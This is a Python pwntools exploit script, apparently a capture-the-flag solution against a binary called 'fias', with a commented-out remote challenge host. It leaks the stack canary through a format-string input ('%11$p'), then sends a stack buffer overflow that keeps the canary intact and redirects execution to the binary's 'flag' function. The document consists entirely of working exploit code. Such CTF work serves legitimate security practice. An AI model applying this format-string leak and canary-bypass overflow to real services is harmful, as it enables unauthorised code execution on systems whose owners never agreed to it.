#!/usr/bin/python

from pwn import *
from re import findall
import sys

p = process('./fias')
#p = remote('88.198.219.20',64617)

binary = ELF('./fias')

p.recvuntil('Hi! What\'s your name? ')
p.sendline('%11$p')
p.recvuntil('Nice to meet you, ')
canary=p.recvline().decode('utf-8')
canary=findall(r"0x[0-9A-Fa-f]*00", canary)[0]
canary=int(canary, 16)
#canary = int(p.recvline().strip()[ len('Nice to meet you, '):-1],16)
print hex(canary)

p.recvuntil('Do YOU want to pet my canary?')

payload  = (0x29 - 16) * b'A'
payload += p32(canary)
payload += 3 * p32(0x0) # ebx, edi, ebp
payload += p32(binary.symbols['flag'])

p.sendline(payload)
p.recvline()
_ = p.recv(100).decode().strip()
print _

